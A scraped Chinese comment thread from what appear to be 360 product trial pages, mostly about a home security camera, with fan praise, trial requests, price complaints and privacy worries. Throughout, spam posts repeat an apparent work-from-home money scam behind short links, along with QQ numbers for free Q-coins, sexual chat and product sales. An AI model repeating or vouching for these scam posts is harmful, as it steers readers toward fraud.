产品不解决一个问题，就是一个鸡肋，就是手的酸疼。手放在鼠标上，连续操作那么2 3个小时都不会累，因为有桌面支撑着，你这个产品能否横放桌面识别，如果只是竖放还不如装个体感摄像头。
我希望360 越来越强大，360家庭卫士功能更全
永远支持360！！！360的产品又好用又安全而且很贴心！360我们永远都支持你！  高端大气上档次的一款新产品，只看外表就很吸引人，功能也是很强大的，希望360多多听听大家的意见与反馈，不断的完善与改进，让此产品做得更加完美，走进千家万户。永远支持360！！！ 
家里有后花园是高尔夫球场就可以买，要不就是累赘，公司给保安买还是可以
永远支持360！！！360的产品又好用又安全而且很贴心！360我们永远都支持你！ 高端大气上档次的一款新产品，只看外表就很吸引人，功能也是很强大的，希望360多多听听大家的意见与反馈，不断的完善与改进，让此产品做得更加完美，走进千家万户。永远支持360！！！ 
我好想要个，这个发售了吗，没赶上试用抽奖， 买个买个 ，计步器 记录健康
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
第一次申请，希望能成功。 
看看人苹果的mini主机，这就是渣渣啊，鸡肋的主机啊，平板的主机吧
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
第8次申请了耶，这次希望能成功-.-
支持360  创意无限
别以为电能就是环保，只是污染在你没看到的地方
我是老师，上自习时，我可以在办公室用摄像头监督我的学生了。静静等候！！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
360等级已迈入26级，游戏只玩360，电脑保护360，浏览器360，随身wifi360，忠诚度不容质疑，第一次看到试用，果断申请， 支持360，愿360明天会更好。
第一次申请360 的东西 希望成功
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
永远支持360！！！360的产品又好用又安全而且很贴心！360我们永远都支持你！ 高端大气上档次的一款新产品，只看外表就很吸引人，功能也是很强大的，希望360多多听听大家的意见与反馈，不断的完善与改进，让此产品做得更加完美，走进千家万户。永远支持360！！！
360就是好 病毒一切全搞定 不用花钱还升级 游戏多得玩不来 大家都爱3 6 0   支持360！！! 支持360！！! 支持360！！! 支持360！！!
太棒了，真想去试用，点赞！！
如果申请试用成功会认真撰写实用心得
确实，只是换成手机能用的NFC芯片，话说高中曾经自改饭卡，一帅爆的戒指
永远支持360！！！360的产品又好用又安全而且很贴心！360我们永远都支持你！ 高端大气上档次的一款新产品，只看外表就很吸引人，功能也是很强大的，希望360多多听听大家的意见与反馈，不断的完善与改进，让此产品做得更加完美，走进千家万户。永远支持360！！！   
挺有创意的。力顶360
红衣教主，请给一个我试用，不胜感激
永远支持360！！！360的产品又好用又安全而且很贴心！360我们永远都支持你！ 高端大气上档次的一款新产品，只看外表就很吸引人，功能也是很强大的，希望360多多听听大家的意见与反馈，不断的完善与改进，让此产品做得更加完美，走进千家万户。永远支持360！！
希望价格能平民些，购买才无压力
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
支持创新产品，解决实际问题！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
红衣教主，给一个高科技的我用用吧
恶心恶心恶心
挺好的  请问能否实现高清视频
哎呀，打错了   
你手机支持最大存储速度是多少呢.
嗯，不错，360自从上市以来一直没有辜负大众用户的期望。总给大家各种惊喜，方便了大家，安全了大众，保证了服务，从来都是求以“没有最好，只有更好”的工作态度，不断创新，不断完善，不断改进；希望奇虎公司能带给全球用户更多安全、创新和惊喜！让360走进千家万户！
看着挺不错的，垂涎迷你投影很久了。等以后价格便宜了再买吧
我支持360，因为360是很好的，支持360 创意无限 ！
拍马屁！！！！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～  
女神啊还有没有节操啊，http://www.2345.com/?k07130221
女神啊还有没有节操啊，http://www.2345.com/?k07130221
这个不是韩剧【你们被包围了】里面那个吗，之前在淘宝上看过价格2499元。希望国产有便宜的！
这个功能很强大，很实用。
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
你们有没有想过，你能看，其他人是不是也能看，提前声明我不是任何其他网站的喷子，但是它的原理，显而易见！！！
这个好！支持
6要是真这么漂亮，就买了
这个好！桌子上太多线真的是看着挺烦的
好东西，360奇酷的产品都很创新、实用
360不会让你得逞的！
看上去不错 但估计量产后的价位也不是我等屌丝能够得到的...
看着功能十分诱人，马上想拥有它，赞起
试用完了送我吧
好多常用的实际的功能  蛮实用的 喜欢  路痴也好丢三落四者也罢 有福音了~~
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
～～ （宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
最主要 可以监控某某老婆老公偷情！~~~~~~~~~~
9494!
从360推出以来本人一直深信360是为了大家服务 虽然现在很多的网络公司的在跟风学360 但我相信在大众的心目中360是最好的最的人心的一个软件
最主要 可以监控某某老婆老公偷情！~~~~~~~~~~ 
色彩不够靓丽哦
好喜欢么     能不能到手呢
360太强大了，出了这么厉害的防丢神器。360我命令你快点出！
感觉好高大上 
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
首次申请，希望成功，从此初步进入智能时代。
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
手机 电脑 什么都是360的，这超级监控视频了吧
好多钱哦，在哪买的到
想要一个啊 不知道能得到免费试用机会
........
这东西被黑了是不是没隐私啊~~~~~~~~~~~~
可以看儿子有没有好好写作业     支持360
 样子确实讨人喜欢 功能介绍不够详尽啊
你休想，我们是祖国的花朵啊
試用完了送我吧 
360不會讓你得逞的！ 
哈哈，我要定了 
我爱360，就像爱自己一样。360我爱你
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
淘宝有售啊！
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～ 
tao  bao有售！
哎呦  不错啊  好好玩 就是希望价位合理些 别让我等屌丝可望而不可即
哇哦，屌爆了
不现实，可能啊，
.....这东西是微型摄像机？这东西能透视？这东西360°？这东西能自己移动？这东西。。。。。。。。。。。。。。。。。。。。。。。
那都挺好 就是价位接受不了 本穷屌丝深感可望而不可即
你太邪恶了，你会被当做黄世仁的。哈哈哈
户外版的会更好~
苹果 主要是各种附加性能 软件 外设 正常用你也就用个30%剩下的都浪费了 还不如买个OPPO FIND 7或N1 屏还大
创意不错 就是投影在室外强光下还有效果吗？能再便宜些吗？
360太坏了 
让我先用用吧 家里电脑用的时间长了不好使了  笔记本摄像头感觉不好用  求给力  求让用用
好像很不错的样子
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
可远观而不可亵玩焉......
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
360加油，支持你！谢谢你，一直保护着我们的电脑，感谢你！
360一直想着卫星们，总是给我们带来惊喜。一直支持360，是正确的！
价位骚贵啊= =”
太神奇了，怎么想出来的？？？？
这个要钱吗？
你是不经常偷情加我QQ1516771678
不错 档次拉开了 价位差距也拉大了= =
嘻嘻嘻，有意思
应该有是个价位高不可攀的产物
不用电脑的价格起码在家3个零，让挤了？
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～ 
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
360的创意不错！让我们的生活工作更方便！
永远支持360，期待中一次，感受新鲜的科技元素！
最好在出个行车记录仪
你的猫不是有开关吗？
3D打印蛮有意思的新产物 一直想尝试 但太贵了
这东西太好了，一定要来一个。
这一次的和上次的多了什么功能？
有钱人的玩具
世界需要360
我是学生，上自习课时，我可以用摄像头监控老师（而切还是手机控制，360度旋转。嘻嘻）还可以看同桌在干什么。上课可以脑袋低着玩手机（ 老师被全面监控，老师不会发现，呵呵） 总而言之（这东西好厉害） 
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
～～（宝妈、学生、上班族都可以 ） 【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
智键的研发明显是360硬件研发团队研发的，腾讯新闻早期就说过了，为此周鸿祎还发了50万的年终奖给这个研发团队！
！！！！！这你也想得出来！！！！！
支持！支持！支持！支持！支持！支持！支持！支持！支持！支持！支持！
又一高科技神器，总觉得必入手赞 强赞
给点建议：1.动态识别率 2.文档及图片的格式支持。3.激光扫描头加高清摄像头。4.扫描后的存储和传输。
一看完介绍，就喜欢的不得了
这个东西的尺寸是多大？
你都说了功能被简化了，这就是360智键的核心，9.9简化手机的使用觉得还可以。
360很强大啊！
How many?????
永远支持360思密达，希望你们能给我这个机会获得哦！喜欢极了！
希望能超越百度耳目！
呵呵 投拍神器啊
看好这款产品，希望能有款这样的物品
填写麻烦，不用了，发表个评论也麻烦，
貌似。。。。有点贵了，最便宜的也得2600多人民币，哎！买不起。
自己也想拥有一个
很想拥有，感觉高达上
确实很实用！期待！
嗯，哥哥好法，值得借鉴
是LED灯吗？？？
我喜欢。。。。。
咱这乡下人也就能看看养养眼了，呵呵
支持360.电脑最好的防护。
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
动手能力会增强的 哈哈 不用单调的在手机屏幕上摩擦了
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
好东西，好期待!可以随时看到我的宝宝
这个东西真好，出了，我一定订购一个。。。
很不错，就是防水么，而且防摔么？？？
好东西！ 买不起...
支持360新产品，又是一项高科技的诞生！支持！
防贼专用！
酷！   ······················
我已经有了360智键2个，360WIFI，TCL360空气卫士，就差这一个了
东西是好，就怕用的不是正地方    
好想要啊~！
价位还好 感觉不错算是智能手表中亲民的一款
丢三落四人员的必备品啊
真的很难中  连续多少期 没中
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～ 
希望会被中签，不中就自己攒钱买个，好东西啊！不能错过！
袖珍造型的性能小怪兽 省空间样子也蛮酷的
不知道插口有几个？个人需要4口的，内存128m貌视小了点，是否可以拓展，或可以支持4G以上的SD卡是否会更好？
分析的不错，点个赞，连购买地址都写了！谢谢了
还可以旋转？是手机控制的吗？如果是，那我无论如何都要买个啊！！！
永远支持360思密达，希望你们能给我这个机会获得哦！喜欢极了！
我是学生，上自习课时，我可以用摄像头监控老师嘻嘻，，我一定订购一个。
酷啊，这有多难啊，做出来要多少钱啊。而且它做出来了，全息网游也差不多了吧？？？？？
永远支持360思密达，希望你们能给我这个机会获得哦！喜欢极了！
如果还可以添加wifi功能就好了!
永远支持360思密达，希望你们能给我这个机会获得哦！喜欢极了！
求便宜...便宜就买 
价位很赞 希望片源等能及时到位
这个摄像头的作用还是非常突出的，用户面非常广阔，只要稳定，易用，价格适中，会非常火。
永远支持360思密达，希望你们能给我这个机会获得哦！喜欢极了！  
这个摄像头的作用还是非常突出的，用户面非常广阔，只要稳定，易用，价格适中，会非常火。  
设计很有爱
学生办公一族必备啊 避免不良坐姿影响身体发育
有点贵啊 啊
360监控大家浏览过的网站还不够，现在都开始监控用户的家里了？看过好莱坞电影“国家安全”“全民公敌”吗？
从电视上看到360问世就想到一定要用360；随后买电脑、上宽带首先就装上了360的产品。无论在单位还是在其他环境只要用电脑，就上360的产品系列， 现在越用越顺：手机等能联网的都是用360卫士。十分看好360，坚信这个产品和以后的产品也会给我们大家带来意想不到的惊喜 ！谢谢你们，360的工人们！
希望能中签，可以随时随地和二宝聊天了
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
正面设计还可以，背面看就很丑了····不能设计的有点科技点吗？？ 外形设计有待提高····
同志，物理是体育老师教的吧？
逗比。。。
就是leap monitor嘛（可能打错了）京东上有这个的开卖了，国外第二代都出来了
我一直在使用360的产品和程序比如360安全卫士360安全阅览器360随身WiFi。。。。。。很希望获得这个
我一直在使用360的产品和程序比如360安全卫士360安全阅览器360随身WiFi。。。。。。很希望获得这个
我一直在使用360的产品和程序比如360安全卫士360安全阅览器360随身WiFi。。。。。。很希望获得这个
厉害，无线的
这得弄个自己专属的游戏屋 不然追着“敌人”射击容易撞到家里的东西 不安全  希望价位再亲民些！
永远支持360思密达，希望你们能给我这个机会获得哦！喜欢极了！  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～  
360 无缝！支持！ 
实在是太霸道了
什么时候上架？求试用 真的太传神了 
一直都支持360.
果然是个好东西！
360太帅了  各种奇特的东西 都是现实中所需要的 又没有的  赶快实现吧  急需
这算是偷窥别人的家庭隐私吗？？
非常支持 大赞
我非常喜欢360 
好想有一个
话说360也搞民用安防了，把安防龙头海康威视置于何地，跟海康萤石系列没法比啊
有用过的说句话，到底好不好
我是360的老用户了 360卫士 .360杀毒 360浏览器 还有360随身Wifi 。。。一直很喜欢 很希望得到这个试用机会
顶顶顶顶360好想有一个啊
喜欢运动，但自己的装备都很业余，求神器
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～
神神神神器啊……………………
好酷 真希望我也能有一个 
好是好，就是太贵了
真希望中一个 
360加油
请问，什么时候能量产呢。我想买。哈哈。
好东西，好期待!可以随时看到家里的宝贝状态了
好想试用一个
在头顶按一个…………
很不错啊 很想拥有一个啊！
360真是个造福人类的好公司，希望以后广泛热卖
360卫士  360杀毒 360浏览器 还有360随身Wifi 。。。360家庭卫士   一直很喜欢
希望可以设计出追踪(信号)功能,所谓的追踪(信号)功能意为,在摄像头设备之外加设可以配带在移动生命体上的信号接收器,通过此接收器,可以让摄像头跟随信号追踪视频,这样可以让使用者更好人性化体会360的高科技.此功能的好处在于可以对在家中配带此信号接收器的的宝宝进行视频信号追踪,关注宝宝行踪安全;或年老思维不清晰的老人配带信号视频追踪器,这样可以让子女更好的关注到老人的行踪轨迹.
蛮炫的。只是忒贵了吧。。。。
不错啊。好东东
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
很不错啊，能接打电话吗?
我支持你360雄起
我~~好稀饭
科技改变世界，创意改变生活。希望产品出的时候我还记得有这款产品
大赞360！非常棒！我手机和电脑都装360没装别的杀毒软件，因为都没360好用。顶顶！
稀饭~~·期待
给我一个吧   …^-^萌萌滴
所以断电用了备用的3000毫安的电源啊，内置路由器了，插网线就能上网，网线总不会停电吧
360家庭卫士已经升级了，支持遥控巡航，和遥控汽车差不多，支持定时巡航功能。摄像头可360度反转无死角监控。内置3000毫安备用电源，断电一样可以监控，内置16G内存无网络状态下可以暂时储存在本地。结合360云盘无限空间免费云储存。【1年自动清除一次，清除前会提醒，由用户选择删除某时间段监控视频】内置迷你路由直接插网线秒变路由。360将发布更多外壳，让视频监控更具人性，有更多建议请@360家庭卫士 
扣扣 188224083
赞一个，期待我能分享试用心得
用了360都5年了，有试过其他的。还是360最好！！！顶顶
买了6个，自己用3个，送人3个，现在都没用了，坏了····按键不弹回了，一直截图截图，拍照拍照，唉。
真的很好！很实用
看起来不错
摄像头+银盘录像机+花生壳@@只是没有语音功能呢~
很期待啊，360会越来越好的！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详 细作讲解～
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
我是不是考虑下先在沿海城市买套房子啊。。。。
建议360度自由旋转，既能增大视角，又能凸显主题
建议360度自由旋转，既能增大视角，又能凸显主题
我倒是赞同@哈尔滨光电线缆 说的，确实有些鸡肋，还需要完善。
怎么供电的，没看到。。。
大赞360！非常棒！我手机和电脑都装360没装别的杀毒软件，因为都没360好用。顶顶！ 
昨天发现了这个功能，嘻嘻
不错！一直都用360
我一直用的360的软件和wifi2代，wifi2买了两个，很好用，360真的很好，也一直在看《小善大爱》，支持360。
可能吗？     这么多人只发50个       但360还是非常好    这个我不能否定 
Gun…………
很喜欢这个产品的功能，希望能马上拥有
对     没错没错
什么时候能够拥有？
好像不错的样子
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复
其实还可以放在车上 行车记录仪也有了
5V 1A输入 USB也可以
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
嗯嗯   好办法   借用一下    哈哈哈
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复 
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复 
看介绍还可以啊，不过发的太少了，才五十个，估计像我这样平时买彩票几年才中上一两块钱的人是没希望了╮(╯▽╰)╭
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复
出来了就买这个，，，，期待中
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～  
希望能中一下，可以看到家中宝贝的活动状态
建议360家庭卫士能360度，无死角。
要是能充电的就好了！
免费刷QB  371196709
 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～   
 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～   
一个人在家好寂寞。找个哥哥来陪我，可以视频喔QQ371196709
一个人在家好寂寞。找个哥哥来陪我，可以视频喔QQ371196709
感觉应该不错
免费试用都是这样的啊  用50个摄像头赚人气哦   http://010jty.taobao.com/亏本大促
360度无死角……。那是带云台功能的了，价格也要贵得多。能有这个就一定能有云台的，只是试用的时候不可能给你一个云台的用。
建议360家庭卫士能360度，无死角
我没中，是吗？
～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】 复 
很不错的哦，超拽创意。希望价格亲民一些。
免费试用都是这样的啊 
～～（宝妈、学生、上班族都可以 ） 【http://t.cn/8sfyr3p】 
～～（宝妈、学生、上班族都可以 ） 【http://t.cn/8sfyr3p】 
很有科技感哦
其实还可以放在车上 行车记录仪也有了
我买了一个120美元
在美国买便宜多了
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～  
很不错，我很喜欢。很想有一个
科技的逆袭啊
多送点就好了。
美国亚马逊已经有了
希望能中只是那个闪灯能在优化一下吗    如果家里有坏人    容易被坏人发现   它是工作的   一直关注360  很期待这个产品
期待中。。。试用一下。
如果能加入音乐功能可能会更好
看着不错吆，抓急
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】  复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
作死的节奏 
以前的玻璃胶再改装一下，不就是3D了吗?
试用怎么样！
～～（宝妈、学生、上班族都可以） ～每夭5o~15o，我详细作讲解～有意者博客联系我  http://t.cn/8sfyr3p
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】 复制到 浏览器打开 ～
～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
好酷而且感觉很实用。
http://t.cn/8sfyr3p
http://t.cn/8sfyr3p
t.cn/8sfyr3p
dwz.cn/gkvFd
我 要买 啥时候上市
不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～ 每夭5o~15o，我详细作讲解～
产品应该很好
太神奇了，好想有一个
用流量还是自带地图的这个
好想要~~拜托拜托
想了解下有创意好玩的东东
不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～ 每夭5o~15o，我详细作讲解～ 
不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我  ～ ～ 每夭5o~15o，我详细作讲解～ 
看家神器啊。
和家里的孩子能够实时视频通话，了解孩子家庭作息
不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～ 每夭5o~15o，我详细作讲解～  
不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我  ～ ～ 每夭5o~15o，我详细作讲解～  
唉！好东西！到了中国，就不是这个价了！！！
可以看到家中宝贝的活动状态 
可以看到家中宝贝的活动状态 
产品介绍不错，用了才知道好不好。
有了这个妈妈在也不用担心买不到诺亚方舟的船票了
具有防盗功能啊！！
Fire Phone 手机.多少钱呢
商品介绍的很不错 用了就知道效果怎么样了
希望能中下
我一直用的360的软件和wifi2代，wifi2买了两个，很好用，360真的很好，也一直在看《小善大爱》，支持360。
我的！一定是我的！ 
在点名网上已经开始众筹了...
感谢认可哦
想买就马上行动哦
看着很不错，很喜欢，很期待。
嗯，如果不介意时间显示，bong绝对是最方便实用的手环。
朋友送了一个！不错奥！
这个东西好啊，家庭必备神器啊，特别方便老人家使用。。。随时可以了解家里的一切动静
什么时候上市？
为何可以这么吊
手机辐射大还是基站辐射大
不知道俺有机会不，支持360，这东西看起来很高大上呀。
看着不赖不知道好用不好用 
啥时候我能有一个
不知道视频存储在哪里，晚上可以使用么？希望介绍更详细些。
这个好东东放在卧室里最好，放在客厅里，如果有家人朋友来会不会喜欢？
要是能投影出5D的就好了 
我们公司就有这样的产品 价格便宜 QQ1224198782
我们公司就有这样的产品 价格便宜 QQ1224198782
我们公司就有这样的产品 价格便宜 QQ1224198782
一直使用360的产品，特别是360wifi为我节省了近500元的流量费，这个太实用了，现在又出这个新产品，对老人对孩子都是保障，感谢360一直努力的付出。
我们公司就有这样的产品 价格便宜 QQ1224198782
我们公司就有这样的产品 价格便宜 QQ1224198782
我们公司就有这样的产品 价格便宜 QQ1224198782
高清画质，大广角，无线传输。语音通话，互联网远程监控家里情况的.360家庭卫士手机客户端。可以通过手机随时随地监控家里的情况。。。特别是家人没人的时候，小偷进来可以全程记录下来，我觉着非常有必要装60家庭卫士...支持360家庭卫士.
一直使用360的产品，特别是360wifi为我节省了近500元的流量费，这个太实用了，现在又出这个新产品，对老人对孩子都是保障，感谢360一直努力的付出
一直使用360的产品，特别是360wifi为我节省了近500元的流量费，这个太实用了，现在又出这个新产品，对老人对孩子都是保障，感谢360一直努力的付出
我们公司就有这样的产品 价格便宜 QQ1224198782
推荐这个摄像头可以用360云盘存储，那样就方便多了，而且可以更好的推广360云盘的
赞啊，太神奇了吧！！！
支持360，希望360一如既往的好，安全有360就放心了，希望360出跟多适用、好用、安全的产品。
这个没有我们公司的好用，比360家庭卫士多了一个插卡录像功能，电脑不需要开机就能录像，可以无线也可以接网络，高清画面就网络远程才流程，有需要的朋友可以加我 一二二四一九八七八二
希望能便宜点
富有创意而且很实用的产品，希望能试用到哦。
一直使用360的产品，特别是360wifi为我节省了近662元的流量费，这个太实用了，现在又出这个新产品，对年轻人和白领都有保障，感谢360一直努力的付出 
期待  期待。。。。
好，我喜欢。
这个的确太贵了
我能拿到就好了
科技感强，挺想试试
这款WiFi路由器不知道安装、设置麻烦不？还有我家是光纤用户，是不是光纤线直接插入路由器的USB接口就可以了？请回答！谢谢
这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我 一二二四一九八七八二 
对滴！360一直免费服务广大群众；这是最给力的
个人觉得贵了点
支持TF卡存储数据吗 ? 还是需要网络才能存储? 
支持360   值得信赖
呵呵360一出来我就用了，和QQ打架的那阶段我一直支持360，如果360和QQ直接然我选择的话，我必须360，
太贵了吧，普通人都买不起
不错还很便宜才两千多
挺啊，这也太酷了吧
5555555555
不太符合实际吧
你的免费给吗？这就是你不如360的地方
这也忒贵了吧
好酷啊！！！
希望知道是否带夜视功能？还有存储的情况是什么，如果与云盘结合起来，就更完美了。
能钱少点吗？很额？ 不错的东西呀？挺喜欢
挺好的，就是太贵了
每次参加这次活动，都空手而归
那以后就不需要打字员了吧
我想在家装的施工工地用，希望有这样的公司为我们提供解决方案。可以让业主实时看到施工、监管。目前一直在找这样的公司中.....。能解决的，请联系我们。企鹅：八四四八三六零二五
喜欢有革命性创新产品，奇虎一直在做。
觉得360的产品都棒棒哒～一直觉着很好使～好想要，不知道运气好不好！！！
能当行车记录仪吗
在哪买》？
看着不错哦
这个可以有
以后不用买书了
好想买个就是不知道贵 不？100以内就考虑
在哪里买这款手环?
家里摄像头坏了，觉得360 的会很好用，这次试试看能不能拿上。
是真的有那么好吗！想买个
好想法，我也很想推荐360出一款行车记录仪，冲击一下这个领域!!
浅黄才是王道
跟以前那款有什么不一样
能当行车记录仪最后不过了。
感觉这产品比那些闭路探头来得方便实用更多，希望自己好运能申请到！！
能保存视频吗？？
看看你能不能拿到
好在哪里呢？
我觉得应该不能 除非电脑装个软件
